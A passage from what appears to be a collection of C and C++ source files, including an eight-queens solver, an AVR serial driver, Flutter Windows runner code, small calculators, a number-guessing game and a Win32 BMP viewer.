if (arr[colCheckInt][col] == 1)     //if there is a queen\n        {\n            //Column is complete, go next column\n            col++;\n            colCheckInt = 0;\n        }\n        else\n        {\n            colCheckInt++;\n        }\n    }\n\n    //check for diagonals\n    int rowDiagonalCheck = row;\n    int colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck--;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck >= 0 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the neg pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck--;\n        colDiagonalCheck++;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck--;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck >= 0)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos neg diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck--;\n    }\n\n    rowDiagonalCheck = row;\n    colDiagonalCheck = col;\n    rowDiagonalCheck++;\n    colDiagonalCheck++;\n    while (rowDiagonalCheck < 8 && colDiagonalCheck < 8)\n    {\n        if (arr[rowDiagonalCheck][colDiagonalCheck] == 1)   //if theres a queen on the pos pos diagonal, invalid space\n        {\n            col++;\n            goto columnCheck;\n        }\n        rowDiagonalCheck++;\n        colDiagonalCheck++;\n    }\n\n    //no queens in row, column, or diagonals, can place queen here.\n    arr[row][col] = 1;\n    //findQueenSpot(arr, row+1, 0, userQueen, queenCount);\n    if (findQueenSpot(arr, row+1, 0, userQueen) == 0) //if the call returned false, remove the just placed queen and try next column\n    {\n        arr[row][col] = 0;\n        col++;\n        goto columnCheck;\n    }\n\n    return 1;\n}\n\nvoid print2DArray(int arr[8][8])\n{\n    int colCounter = 1;\n    int tmpRow = 0;\n    cout << \"   1  2  3  4  5  6  7  8\" << endl; //first row\n    for (int i = 0; i < 8; i++) //for every row that you need to print\n    {\n        int j = 0;  //column counter\n        cout << colCounter << \"  \";     //print the row#\n        while (j < 8)    // in each column, check if queen is in spot & print, otherwise print '-'\n        {\n            if (arr[i][j] == 1) //if value in array is 1, its a queen\n                cout << \"Q\";\n            else                            //otherwise, its an empty space\n                cout << \"-\";\n            cout << \"  \";                   //spacing\n            j++;                            //increment col counter\n        }\n        cout << endl;\n        colCounter++;\n    }\n}",
    "#include \"usart.h\"\n#include <avr/io.h> // Include here if avr/io.h is needed for USART functions\n#include \"bit.h\"\n\n#include <stdlib.h>\n\n// Set the baud rate\nvoid usart_init(unsigned int ubrr)\n{\n  UBRR0H = (unsigned char)(ubrr >> 8);\n  UBRR0L = (unsigned char)ubrr;\n  // enable receiver and transmitter\n  UCSR0B = (1 << TXEN0) | (1 << RXEN0);\n  // set frame format: USBS0 = 0b1 2stop bit, UCSZ00 = 0b11 8bit data,\n  UCSR0C = (1 << USBS0) | (3 << UCSZ00);\n}\n\nvoid usart_transmit(unsigned char data)\n{\n  /* Wait for empty transmit buffer */\n  while (!(UCSR0A & (1 << UDRE0)))\n    ;\n  /* Put data into buffer, sends the data */\n  UDR0 = data;\n}\n\nvoid usart_tx_string(const char *pStr)\n{\n  while (*pStr != '\\0')\n  {\n    usart_transmit(*pStr);\n    pStr++;\n  }\n}\n\nvoid usart_tx_float(float x, char num_digits_int, char num_digits_decimal)\n{\n  char num_elements = num_digits_int + num_digits_decimal + 1 + 1; // one decimal point and one null terminator\n  char buffer[num_elements];\n\n  dtostrf(x, num_elements - 1, num_digits_decimal, buffer);\n  buffer[num_elements - 1] = '\\0';\n  usart_tx_string(buffer);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_application_ejercicio10\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<stdio.h>\nvoid funcmul(int*,int*,int*);\nvoid funcdiv(int*,int*,int*);\nvoid funcadd(int*,int*,int*);\nvoid funcsub(int*,int*,int*);\nint main()\n{\n    int mul,sub,div,add;\n     int n1,n2;\n     char op;\n     printf(\"Enter your  first Number :\\n\");\n     scanf(\"%d\",&n1);\n      printf(\"Enter The Operator(*,-,+,/):\\n\");\n     scanf(\" %c\",&op);\n     printf(\"Enter your Second Number:\\n\");\n     scanf(\"%d\",&n2);\n\n\n     if(op=='*'){\n        funcmul(&n1,&n2,&mul);\n        printf(\"Multiplication=%d\",mul);\n        return 0;\n     }if(op=='/'){\n       funcdiv(&n1,&n2,&div);\n         printf(\"Division=%d\",div);\n         return 0;\n     }if(op=='+'){\n      funcadd(&n1,&n2,&add);\n        printf(\"Addition=%d\",add);\n        return 0;\n     }if(op=='-'){\n      funcsub(&n1,&n2,&sub);\n        printf(\"Subtraction=%d\",sub);\n        return 0;\n     }else{\n       printf(\"Invalid\");\n       return 0;\n     }\n\n}\nvoid funcmul(int* n1,int* n2,int* mul){\n\n      *mul=*n1 * *n2;\n}\nvoid funcadd(int* n1,int* n2,int* add){\n\n      *add=*n1 + *n2;\n}\n\nvoid funcsub(int* n1,int* n2,int* sub){\n\n      *sub=*n1 - *n2;\n}\n\nvoid funcdiv(int* n1,int* n2,int* div){\n\n      *div=*n1 / *n2;\n}\n\n\n\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n  Um algoritmo que tem como objetivo ser um jogo com 3 niveis de dificuldade, \nsendo elas: [facil, medio, dificil].\n  O jogo ter\u00e1 um numero sorteado e o objetivo do jogador \u00e9 descobrir o numero sorteado pelo metodo de tentativa e erro.\n*/\n#include <iostream> //Biblioteca principal de entrada e saida padr\u00e3o.\n#include <cstdlib> // Bibliotecas padr\u00e3o do c.\n#include <ctime> // Biblioteca time do c.\n\nusing namespace std; // using std para agilizar o proscesso de codar os 'cout' e 'cin'.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos); // Mostrando minha fun\u00e7\u00e3o para o codigo.\n\nbool chutes(short numSorte, short dificuldade, int *tentativas, short *pontos){ // Declarando fun\u00e7\u00e3o.\n  short numChute = 0; // Dando um valor inicial para numChute.\n  short numD2 = -1; // Valor inicial para numD2.\n\n  if(dificuldade == 2){ // Se escolha da dificuldade seja media, fa\u00e7a numD2 == 16 e iniciar com 200 pontos.\n    numD2 = 16;\n    *pontos = 200;\n  }else if(dificuldade == 3){ // Se dificuldade for igual a dificil numD2 == 6 e iniciar com 300 pontos.\n    numD2 = 6;\n    *pontos = 300;\n  }\n\n  do{\n\n    cout << \"\\n\\tTentativas \" << *tentativas << \" chute um numero: \"; // Mostra o numero da tentativa indo de 0 a infinito dependendo da dificuldade escolhida.\n\n    cin >> numChute; // l\u00ea o valor chutado.\n\n    if(numChute < numSorte)cout << \"\\t\\033[1;91mSeu numero \u00e9 menor que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for menor que numro sorteado vai escrever em vermelho uma mensagem sobre.\n    else if(numChute > numSorte) cout << \"\\t\\033[1;33mSeu numero \u00e9 maior que o numero da sorte.\\x1b[0m\\n\"; // Se o numero chutado for maior que numro sorteado vai escrever em amarelo uma mensagem sobre.\n\n    if(*tentativas > 0 || numChute == numSorte){ // Condi\u00e7\u00e3o para pular a primeira execu\u00e7\u00e3o e caso acerte.\n      if(dificuldade == 1) *pontos = *pontos - 2; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 2) *pontos = *pontos - 12; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n      else if(dificuldade == 3) *pontos = *pontos - 43; // Faz a diminui\u00e7\u00e3o de pontos de acordo com dificuldade escolhida.\n    }\n\n    *tentativas = *tentativas + 1; // Acrescenta 1 a tentativas.\n  }while(numChute != numSorte && *tentativas != numD2); // Vai continuar perguntando o valor sorteado at\u00e9 que acerte ou acabe o numero definido de tentativas(O numero de tentativas ser\u00e1 definido de acordo com o nivel de dificuldade escolhida pelo jogador.).\n\n  return (numChute == numSorte); // Retorna um valor boleano sendo 1 : 0\n}\n\nint main(){\n  \n  srand(time(NULL));\n  const short numSorte = rand() % 101; // O numero sorteado\n\n  short dificuldade = 0; // Valor inicial para dificuldade\n  int tentativas = 0; // valor inicial para o numero de tentativas\n  short pontos = 100; // valor inicial de pontos, para caso seja escolhida a dificuldade 1.\n\n  cout << \"\\t********************\\n\";\n  cout << \"\\t*----Hello Word----*\\n\";\n  cout << \"\\t********************\\n\";\n\n  cout << \"\\n\\tEscolha sua dificuldade \\n \\x1b[1;96mfacil: 1\\n \\x1b[1;90mmedio: 2\\n \\x1b[1;95mdificil: 3\\n\\t\\x1b[0mdificuldade: \";\n  cin >> dificuldade; // Escolhe a dificuldade.\n\n  if(chutes(numSorte, dificuldade, &tentativas, &pontos)) cout << \"\\n\\t\\x1b[1;33mVoc\u00ea ganhou, parab\u00e9ns\\n\"; // Aqui vai executar a fun\u00e7\u00e3o chutes e quado finalizar vai retornar um valor boleano, sendo que se for verdadeiro, aparecer\u00e1 a mensagem para o jogador que ele ganhou.\n  else{\n    cout << \"\\n\\t\\033[91mVoc\u00ea perdeu. O numero era \" << numSorte << \" quem sabe na proxima.\\n\"; // Caso contrario mostrar\u00e1 a mensagem que perdeu.\n    pontos = 0; // E vai perder a pontua\u00e7\u00e3o.\n  }\n\n  cout << \"\\n\\tVoc\u00ea tentou \" << tentativas << \" vezes\\n\\n\\t\" << pontos << \" Pontos\\n\\n\"; // Mostra o numero de vezes que chutou at\u00e9 acertar ou at\u00e9 perder, e mostra sua pontua\u00e7\u00e3o final.\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/* Creation date: 4-2-2024\n   Teacher: Dr. Tyson McMillan \n   School: Tarrant County College\n   Purpose: A basic calculator that calculates the velocity, acceleration, motion,\n   weight, momentum, and newton's second law given the right inputs and options.\n   Skills learned/gained from the assignment: I learned how to utilize the while\n   loop more efficiently.\n*/\n#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\nvoid calculateVelocity();\nvoid calculateAcceleration();\nvoid calculateMotion();\nvoid calculateWeight();\nvoid calculateMomentum();\nvoid calculateNewtonSecondLaw();\n\nint main(){\n  while(true){\n    char option;\n    cout <<\"What do you want to calculate. \\nEnter 'V' to calculate velocity, 'A' to calculate acceleration, 'M' to calculate motion, 'W' to calculate weight, 'P' to calculate momentum, or 'E' to end the whole program \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'V'){\n      calculateVelocity();\n    }\n    else if(option == 'A'){\n      calculateAcceleration();\n    }\n    else if(option == 'M'){\n      calculateMotion();\n    }\n    else if(option == 'W'){\n      calculateWeight();\n    }\n    else if(option == 'P'){\n      calculateMomentum();\n    }\n    else if(option == 'N'){\n      calculateNewtonSecondLaw();\n    }\n    else if(option == 'E'){\n      exit (0);\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n\n  return 0; \n}\n\nvoid calculateVelocity(){\n  double ds = 0.0, dt = 0.0, v = 0.0;\n  string  dsUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in distance: \"<< endl;\n  cin >> ds;\n  cout << \"Enter the unit for distance: \"<< endl;\n  cin >> dsUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  v = ds/dt;\n\n  cout<< \"The is velocity is: \"<< v << \"=\" << dsUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateAcceleration(){\n  double dv = 0.0, dt = 0.0, a = 0.0;\n  string  dvUnits = \"\", dtUnits = \"\";\n\n  cout << \"Enter the value for change in velocity: \"<< endl;\n  cin >> dv;\n  cout << \"Enter the unit for velocity: \"<< endl;\n  cin >> dvUnits;\n\n\n  cout << \"Enter the value for change in time: \"<< endl;\n  cin >> dt;\n  cout << \"Enter the unit time: \"<< endl;\n  cin >> dtUnits;\n\n  a = dv/dt;\n\n  cout<< \"The is acceleration is: \"<< a << \"=\" << dvUnits << \"/\" << dtUnits << endl;\t\n}\n\nvoid calculateMotion(){\n  while(true){\n    char option;\n    cout <<\"Enter 'a' to solve v, 's' solve for s, 'd' to solve for v^2, or 'v' to solve for v_bar \"<< endl;\n    restart: \n      cin >> option;\n\n    if(option == 'a'){\n      double v = 0.0, v0 = 0.0, a = 0.0, t = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n\n      v = v0 + (a*t);\n\n      cout << \"The velocity: \"<< v << endl;\n\n      }\n    else if(option == 's'){\n      double s0 = 0.0, v0 = 0.0, a = 0.0, t = 0.0, s = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial time: \"<< endl;\n      cin >> t;\n      cout << \"Enter initial initial distance: \"<< endl;\n      cin >> s0;\n\n      s = s0 + (v0*t) + (0.5*a*pow(t,2));\n\n      cout << \"The final distance is: \"<< s << endl;\n    }\n    else if(option == 'd'){\n      double v = 0.0, v0 = 0.0, s = 0.0, s0 = 0.0, a = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the acceleration: \"<< endl;\n      cin >> a;\n      cout << \"Enter initial distance: \"<< endl;\n      cin >> s0;\n      cout << \"Enter final distance: \"<< endl;\n      cin >> s;\n\n\n      v = pow(v0, 2) + (2 * a * (s-s0));\n\n      cout << \"The v^2: \"<< v << endl;\n    }\n    else if(option == 'v'){\n      double v = 0.0, v0 = 0.0, v_bar = 0.0;\n\n      cout << \"Enter initial velocity: \"<< endl;\n      cin >> v0;\n      cout << \"Enter the final velocity: \"<< endl;\n      cin >> v;\n\n      v_bar = 0.5 * (v+v0);\n\n      cout << \"The v_bar: \"<< v_bar << endl;\n\n    }\n    else{\n      cout << \"Please Enter a valid input: \"<< endl;\n      goto restart;\n    }\n\n  }\n}\n\nvoid calculateNewtonSecondLaw(){\n  double N = 0.0, m = 0.0, a = 0.0;\n  string mUnits = \" \", aUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the acceleration: \"<< endl;\n  cin >> a;\n  cout << \"Enter the unit for acceleration: \"<< endl;\n  cin >> aUnits;\n\n  N = m*a;\n\n  cout<< \"The calculated force is: \"<< N << mUnits << \" \" << aUnits << endl;\n}\n\nvoid calculateWeight(){\n  double W = 0.0, m = 0.0, g = 0.0;\n  string mUnits = \" \", gUnits = \" \";\n\n  cout << \"Enter the mass: \"<< endl;\n  cin >> m;\n  cout << \"Enter the unit mass: \"<< endl;\n  cin >> mUnits;\n  cout << \"Enter the gravity: \"<< endl;\n  cin >> g;\n  cout << \"Enter the unit for gravity: \"<< endl;\n  cin >> gUnits;\n\n  W = m*g;\n\n  cout<< \"",
    "\ufeff#include <windows.h>\n#include <commdlg.h>\n#include <string>\n#include <fstream>\n#include <vector>\n#include <iostream>\n#include <locale>\n#include <codecvt>\n\nusing namespace std;\n\n// \u0413\u043b\u043e\u0431\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435\nHBITMAP hBitmap = NULL;\n// \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u0438\u0435 \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440\u0430 \u043c\u0435\u043d\u044e\n#define IDM_OPEN 1001\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f BMP \u0444\u0430\u0439\u043b\u0430 \u0447\u0435\u0440\u0435\u0437 \u0434\u0438\u0430\u043b\u043e\u0433\u043e\u0432\u043e\u0435 \u043e\u043a\u043d\u043e\n\n\n\nbool OpenBMPFile(HWND hWnd, wchar_t** selectedFile)\n{\n    OPENFILENAME ofn;\n    wchar_t szFile[MAX_PATH] = L\"\";\n\n    ZeroMemory(&ofn, sizeof(ofn));\n    ofn.lStructSize = sizeof(ofn);\n    ofn.hwndOwner = hWnd;\n    ofn.lpstrFilter = L\"BMP Files\\0*.bmp\\0\";\n    ofn.lpstrFile = szFile;\n    ofn.lpstrTitle = L\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 BMP \u0444\u0430\u0439\u043b\";\n    ofn.nMaxFile = sizeof(szFile);\n    ofn.Flags = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;\n\n    if (GetOpenFileName(&ofn))\n    {\n        *selectedFile = _wcsdup(szFile);\n        return true;\n    }\n\n    return 0;\n}\n\n\nstruct ImgInfo {\n    std::vector<COLORREF>* pixels;\n    int height, width, figXMin, figXMax, figYMin, figYMax;\n};\n\nImgInfo* readPixelColorsFromFile(const wchar_t* filename) {\n    ifstream file(filename, ios::binary);\n    vector<COLORREF>* pixelColors = new vector<COLORREF>();\n\n    if (file.is_open()) {\n        char* header = new char[54];\n        file.read(header, 54);\n\n        int width = *(int*)&header[18];\n        int height = *(int*)&header[22];\n\n        int dataSize = width * height * 3;\n\n        char* data = new char[dataSize];\n\n        file.read(data, dataSize);\n\n        COLORREF backgroundColor = RGB((unsigned char)data[2], (unsigned char)data[1], (unsigned char)data[0]);\n\n        int figXMin = width, figYMin = height, figXMax = 0, figYMax = 0;\n\n        for (int i = 0; i < dataSize; i += 3) {\n            COLORREF color = RGB((unsigned char)data[i + 2], (unsigned char)data[i + 1], (unsigned char)data[i]);\n            pixelColors->push_back(color);\n\n            if (color != backgroundColor) {\n                int currentX = (i / 3) % width;\n                int currentY = (i / 3) / width;\n\n                if (currentX < figXMin) figXMin = currentX;\n                if (currentX > figXMax) figXMax = currentX;\n                if (currentY < figYMin) figYMin = currentY;\n                if (currentY > figYMax) figYMax = currentY;\n            }\n        }\n\n        delete[] data;\n        delete[] header;\n\n        file.close();\n\n        for (COLORREF& color : *pixelColors) {\n            if (color == backgroundColor) {\n                color = RGB(255, 255, 255);\n            }\n        }\n\n        ImgInfo* info = new ImgInfo;\n        info->pixels = pixelColors;\n        info->height = height;\n        info->width = width;\n        info->figXMin = figXMin;\n        info->figXMax = figXMax;\n        info->figYMin = figYMin;\n        info->figYMax = figYMax;\n\n        return info;\n    }\n    return nullptr;\n}\n\nvoid DrawImage(const ImgInfo* imageInfo, HDC hdcWindow, HWND hwnd) {\n    int figWidth = imageInfo->figXMax - imageInfo->figXMin + 1;\n    int figHeight = imageInfo->figYMax - imageInfo->figYMin + 1;\n    std::vector<COLORREF>* pixelColors = imageInfo->pixels;\n\n    // \u0417\u0430\u043a\u0440\u0430\u0448\u0438\u0432\u0430\u0435\u043c \u043e\u043a\u043d\u043e \u0431\u0435\u043b\u044b\u043c\u0438 \u043f\u0438\u043a\u0441\u0435\u043b\u044f\u043c\u0438\n    HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));\n    RECT windowRect;\n    GetClientRect(hwnd, &windowRect);\n    FillRect(hdcWindow, &windowRect, whiteBrush);\n    DeleteObject(whiteBrush);\n\n    // \u0412\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u043f\u0440\u0430\u0432\u043e\u043c \u0446\u0435\u043d\u0442\u0440\u0435 \u043e\u043a\u043d\u0430\n    int windowCenterY = (windowRect.bottom - windowRect.top) / 2;\n    int positionX = windowRect.right - figWidth; // \u0420\u0430\u0441\u0447\u0451\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b X \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441 \u043f\u0440\u0430\u0432\u043e\u0439 \u0441\u0442\u043e\u0440\u043e\u043d\u044b\n    int positionY = windowCenterY - figHeight / 2; // \u0420\u0430\u0441\u0447\u0451\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b Y \u0434\u043b\u044f \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u043c \u0446\u0435\u043d\u0442\u0440\u0435\n\n    for (int x = 0; x < figWidth; ++x) {\n        for (int y = 0; y < figHeight; ++y) {\n            int flippedX = x; // \u0437\u0435\u0440\u043a\u0430\u043b\u0438\u043c, \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e\n            int flippedY = figHeight - 1 - y;  // \u0437\u0435\u0440\u043a\u0430\u043b\u0438\u043c, \u0435\u0441\u043b\u0438 \u043d\u0443\u0436\u043d\u043e\n            SetPixel(hdcWindow, positionX + x, positionY + y, pixelColors->at((imageInfo->figYMin + flippedY) * imageInfo->width + imageInfo->figXMin + flippedX));\n        }\n    }\n}\n\n\n\n\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 